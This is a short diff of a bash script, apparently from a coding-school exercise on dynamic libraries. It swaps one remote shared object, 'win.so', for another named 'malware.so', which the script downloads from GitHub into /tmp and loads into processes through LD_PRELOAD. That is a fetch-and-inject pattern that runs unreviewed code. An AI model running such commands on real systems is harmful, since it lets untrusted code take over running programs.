@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/win.so https://github.com/Zevrov/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/win.so
-export LD_PRELOAD=/tmp/win.so
+wget -P /tmp/ https://raw.github.com/YassineRKB/alx-low_level_programming/main/0x18-dynamic_libraries/malware.so
+export LD_PRELOAD=/tmp/malware.so
